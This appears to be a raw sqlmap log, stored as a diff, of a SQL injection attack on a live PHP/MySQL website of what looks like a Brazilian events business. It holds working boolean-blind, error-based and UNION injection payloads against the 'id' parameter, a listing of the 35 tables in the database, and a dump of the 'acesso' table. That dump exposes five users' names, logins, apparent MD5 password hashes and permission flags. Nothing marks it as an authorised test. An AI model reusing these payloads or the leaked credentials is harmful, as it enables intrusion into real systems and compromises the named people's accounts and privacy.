@@ -1,0 +1,157 @@
+sqlmap identified the following injection point(s) with a total of 72 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 1649=1649
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1 AND (SELECT 4000 FROM(SELECT COUNT(*),CONCAT(0x7171766a71,(SELECT (ELT(4000=4000,1))),0x7162707871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171766a71,0x6266565062684a516947787261426a434d426f6b4e756f50427a7578775246486d6b527561614d54,0x7162707871),NULL-- UJTy
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache 2.4.38, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] bethbahi_beth
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 1649=1649
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1 AND (SELECT 4000 FROM(SELECT COUNT(*),CONCAT(0x7171766a71,(SELECT (ELT(4000=4000,1))),0x7162707871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171766a71,0x6266565062684a516947787261426a434d426f6b4e756f50427a7578775246486d6b527561614d54,0x7162707871),NULL-- UJTy
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache 2.4.38, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0
+Database: bethbahi_beth
+[35 tables]
++--------------------------+
+| acesso                   |
+| banco                    |
+| bancos                   |
+| caixa                    |
+| categorias               |
+| cliente                  |
+| clientes                 |
+| como                     |
+| contato                  |
+| depoimentos              |
+| empresa                  |
+| empresas                 |
+| estados                  |
+| estoque                  |
+| estoque_motivo           |
+| eventos                  |
+| eventos_categoria        |
+| festas                   |
+| festas_terceirizados     |
+| fichas                   |
+| fichas_eventos           |
+| fotos_index              |
+| funcoes                  |
+| itens_menu               |
+| leventos                 |
+| menu                     |
+| newsletter               |
+| orcamento                |
+| orcamentos               |
+| orcamentos_terceirizados |
+| pagamento                |
+| produtos                 |
+| receber                  |
+| terceirizados            |
+| videos                   |
++--------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 1649=1649
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1 AND (SELECT 4000 FROM(SELECT COUNT(*),CONCAT(0x7171766a71,(SELECT (ELT(4000=4000,1))),0x7162707871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171766a71,0x6266565062684a516947787261426a434d426f6b4e756f50427a7578775246486d6b527561614d54,0x7162707871),NULL-- UJTy
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache 2.4.38, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0
+Database: bethbahi_beth
+[35 tables]
++--------------------------+
+| acesso                   |
+| banco                    |
+| bancos                   |
+| caixa                    |
+| categorias               |
+| cliente                  |
+| clientes                 |
+| como                     |
+| contato                  |
+| depoimentos              |
+| empresa                  |
+| empresas                 |
+| estados                  |
+| estoque                  |
+| estoque_motivo           |
+| eventos                  |
+| eventos_categoria        |
+| festas                   |
+| festas_terceirizados     |
+| fichas                   |
+| fichas_eventos           |
+| fotos_index              |
+| funcoes                  |
+| itens_menu               |
+| leventos                 |
+| menu                     |
+| newsletter               |
+| orcamento                |
+| orcamentos               |
+| orcamentos_terceirizados |
+| pagamento                |
+| produtos                 |
+| receber                  |
+| terceirizados            |
+| videos                   |
++--------------------------+
+
+Database: bethbahi_beth
+Table: acesso
+[5 entries]
++----+----------------+----------------+----------------+-------------------+------------------+----------------------------------+--------------+-------------+--------------+--------------+--------------+--------------+--------------+--------------+--------------+--------------+--------------+---------------+---------------+---------------+---------------+---------------+---------------+---------------+---------------+---------------+---------------+----------------+----------------+----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+-------------------+-------------------+-------------------+-------------------+-------------------+-------------------+-------------------+-------------------+-------------------+-------------------+-------------------+-------------------+--------------------+--------------------+--------------------+--------------------+--------------------+--------------------+--------------------+--------------------+--------------------+--------------------+--------------------+--------------------+--------------------+--------------------+---------------------+---------------------+---------------------+---------------------+---------------------+---------------------+---------------------+---------------------+---------------------+---------------------+---------------------+---------------------+----------------------+----------------------+----------------------+-----------------------+-----------------------+-----------------------+-----------------------+-----------------------+------------------------+------------------------+------------------------+------------------------+------------------------+-------------------------+-------------------------+-------------------------+--------------------------+---------------------------+
+| id | videos_alterar | videos_excluir | videos_incluir | videos_visualizar | nome             | senha                            | login        | news_enviar | news_alterar | news_excluir | news_incluir | como_alterar | menu_excluir | como_excluir | menu_incluir | menu_alterar | como_incluir | celular_email | caixa_alterar | banco_incluir | fotos_alterar | caixa_incluir | fotos_excluir | banco_excluir | banco_alterar | fotos_incluir | caixa_excluir | festas_excluir | festas_incluir | festas_alterar | funcoes_excluir | funcoes_alterar | receber_incluir | news_visualizar | receber_alterar | eventos_excluir | eventos_alterar | receber_excluir | estoque_incluir | contato_excluir | funcoes_incluir | menu_visualizar | como_visualizar | estoque_excluir | estoque_alterar | caixa_relatorio | eventos_incluir | clientes_alterar | usuarios_alterar | clientes_excluir | clientes_incluir | empresas_excluir | produtos_excluir | leventos_incluir | usuarios_incluir | leventos_excluir | produtos_incluir | produtos_alterar | banco_visualizar | empresas_alterar | empresas_incluir | leventos_alterar | usuarios_excluir | festas_relatorio | caixa_visualizar | fotos_visualizar | pagamento_incluir | categoria_alterar | categoria_excluir | orcamento_excluir | pagamento_excluir | festas_visualizar | categoria_incluir | orcamento_alterar | orcamento_incluir | festas_relatorio2 | estoque_relatorio | pagamento_alterar | funcoes_visualizar | orcamentos_excluir | receber_visualizar | produtos_relatorio | empresa_visualizar | estoque_visualizar | itens_menu_alterar | itens_menu_excluir | orcamento_contrato | contato_visualizar | eventos_visualizar | itens_menu_incluir | celular_visualizar | orcamentos_alterar | produtos_visualizar | depoimentos_alterar | depoimentos_excluir | empresas_visualizar | categoria_relatorio | fotos_index_excluir | leventos_visualizar | orcamento_relatorio | clientes_visualizar | usuarios_visualizar | fotos_index_incluir | depoimentos_incluir | orcamento_visualizar | categoria_visualizar | pagamento_visualizar | terceirizados_alterar | itens_menu_visualizar | terceirizados_incluir | orcamentos_visualizar | terceirizados_excluir | depoimentos_visualizar | estoque_motivo_alterar | estoque_motivo_excluir | fotos_index_visualizar | estoque_motivo_incluir | fotos_categoria_alterar | fotos_categoria_incluir | fotos_categoria_excluir | terceirizados_visualizar | estoque_motivo_visualizar |
++----+----------------+----------------+----------------+-------------------+------------------+----------------------------------+--------------+-------------+--------------+--------------+--------------+--------------+--------------+--------------+--------------+--------------+--------------+---------------+---------------+---------------+---------------+---------------+---------------+---------------+---------------+---------------+---------------+----------------+----------------+----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+-------------------+-------------------+-------------------+-------------------+-------------------+-------------------+-------------------+-------------------+-------------------+-------------------+-------------------+-------------------+--------------------+--------------------+--------------------+--------------------+--------------------+--------------------+--------------------+--------------------+--------------------+--------------------+--------------------+--------------------+--------------------+--------------------+---------------------+---------------------+---------------------+---------------------+---------------------+---------------------+---------------------+---------------------+---------------------+---------------------+---------------------+---------------------+----------------------+----------------------+----------------------+-----------------------+-----------------------+-----------------------+-----------------------+-----------------------+------------------------+------------------------+------------------------+------------------------+------------------------+-------------------------+-------------------------+-------------------------+--------------------------+---------------------------+
+| 1  | S              | S              | S              | S                 | xmaster          | 88D9C2C2BAD85CA89121498E845AFE6D | xmaster      | S           | S            | S            | S            | S            | S            | S            | S            | S            | S            | S             | S             | S             | S             | S             | S             | S             | S             | S             | S             | S              | S              | S              | S               | S               | S               | S               | S               | S               | S               | S               | S               | S               | S               | S               | S               | S               | S               | S               | S               | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                 | S                 | S                 | S                 | S                 | S                 | S                 | S                 | S                 | S                 | S                 | S                 | S                  | S                  | S                  | S                  | S                  | S                  | S                  | S                  | S                  | S                  | S                  | S                  | S                  | S                  | S                   | S                   | S                   | S                   | S                   | S                   | S                   | S                   | S                   | S                   | S                   | S                   | S                    | S                    | S                    | S                     | S                     | S                     | S                     | S                     | S                      | S                      | S                      | S                      | S                      | S                       | S                       | S                       | S                        | S                         |
+| 3  | S              | S              | S              | S                 | Camila Bahiense  | 93A943D6308B36EA8CA0724243A527E9 | camila       | S           | S            | S            | S            | S            | S            | S            | S            | S            | S            | S             | S             | S             | NULL          | S             | S             | S             | S             | S             | S             | S              | S              | S              | S               | S               | S               | S               | S               | S               | S               | S               | S               | S               | S               | S               | S               | S               | S               | S               | S               | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                 | S                 | S                 | S                 | S                 | S                 | S                 | S                 | S                 | S                 | S                 | S                 | S                  | S                  | S                  | S                  | S                  | S                  | S                  | S                  | S                  | S                  | S                  | S                  | S                  | S                  | S                   | S                   | S                   | S                   | S                   | S                   | S                   | S                   | S                   | S                   | S                   | S                   | S                    | S                    | S                    | S                     | S                     | S                     | S                     | S                     | S                      | NULL                   | NULL                   | S                      | NULL                   | S                       | S                       | S                       | S                        | NULL                      |
+| 4  | S              | S              | S              | S                 | Rejane           | 5E9CA4340003DEC145070C9A6AAC8237 | rejane       | S           | S            | S            | S            | S            | N            | S            | N            | N            | S            | N             | N             | N             | NULL          | N             | N             | N             | N             | N             | N             | N              | N              | N              | N               | N               | N               | S               | N               | N               | N               | N               | S               | S               | N               | N               | S               | S               | S               | S               | N               | N                | N                | N                | N                | N                | S                | N                | N                | N                | S                | S                | N                | N                | N                | N                | N                | N                | N                | N                | N                 | S                 | S                 | N                 | N                 | S                 | S                 | N                 | N                 | N                 | S                 | N                 | S                  | N                  | N                  | S                  | S                  | S                  | N                  | N                  | N                  | S                  | N                  | N                  | N                  | N                  | S                   | S                   | S                   | S                   | S                   | N                   | N                   | N                   | N                   | N                   | N                   | S                   | N                    | S                    | N                    | N                     | N                     | N                     | N                     | N                     | S                      | S                      | S                      | S                      | S                      | N                       | N                       | N                       | S                        | S                         |
+| 7  | S              | S              | S              | S                 | Francisco        | 05BADA269E795BB5F30A22396F0FF0AE | francisco    | S           | S            | S            | S            | S            | S            | S            | S            | S            | S            | S             | S             | S             | NULL          | S             | S             | S             | S             | S             | S             | S              | S              | S              | S               | S               | S               | S               | S               | S               | S               | S               | S               | S               | S               | S               | S               | S               | S               | S               | S               | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                | S                 | S                 | S                 | S                 | S                 | S                 | S                 | S                 | S                 | S                 | S                 | S                 | S                  | S                  | S                  | S                  | S                  | S                  | S                  | S                  | S                  | S                  | S                  | S                  | S                  | S                  | S                   | S                   | S                   | S                   | S                   | S                   | S                   | S                   | S                   | S                   | S                   | S                   | S                    | S                    | S                    | S                     | S                     | S                     | S                     | S                     | S                      | S                      | S                      | S                      | S                      | S                       | S                       | S                       | S                        | S                         |
+| 8  | NULL           | NULL           | NULL           | NULL              | Aryel Marcelo    | 771133857F7DE4511F1E5B9FBA60C13D | aryelmarcelo | NULL        | NULL         | NULL         | NULL         | NULL         | S            | NULL         | S            | S            | NULL         | NULL          | S             | S             | NULL          | S             | S             | S             | S             | S             | S             | S              | S              | S              | S               | S               | N               | NULL            | N               | N               | N               | N               | S               | NULL            | S               | S               | NULL            | S               | S               | S               | N               | N                | N                | N                | N                | S                | S                | S                | N                | S                | S                | S                | S                | S                | S                | S                | N                | S                | S                | S                | S                 | S                 | S                 | S                 | S                 | S                 | S                 | S                 | S                 | S                 | S                 | S                 | S                  | S                  | N                  | S                  | NULL               | S                  | S                  | S                  | S                  | NULL               | S                  | S                  | NULL               | S                  | S                   | NULL                | NULL                | S                   | S                   | S                   | S                   | S                   | N                   | N                   | S                   | NULL                | S                    | S                    | S                    | S                     | S                     | S                     | S                     | S                     | NULL                   | S                      | S                      | S                      | S                      | S                       | S                       | S                       | S                        | S                         |
++----+----------------+----------------+----------------+-------------------+------------------+----------------------------------+--------------+-------------+--------------+--------------+--------------+--------------+--------------+--------------+--------------+--------------+--------------+---------------+---------------+---------------+---------------+---------------+---------------+---------------+---------------+---------------+---------------+----------------+----------------+----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+-----------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+------------------+-------------------+-------------------+-------------------+-------------------+-------------------+-------------------+-------------------+-------------------+-------------------+-------------------+-------------------+-------------------+--------------------+--------------------+--------------------+--------------------+--------------------+--------------------+--------------------+--------------------+--------------------+--------------------+--------------------+--------------------+--------------------+--------------------+---------------------+---------------------+---------------------+---------------------+---------------------+---------------------+---------------------+---------------------+---------------------+---------------------+---------------------+---------------------+----------------------+----------------------+----------------------+-----------------------+-----------------------+-----------------------+-----------------------+-----------------------+------------------------+------------------------+------------------------+------------------------+------------------------+-------------------------+-------------------------+-------------------------+--------------------------+---------------------------+
+
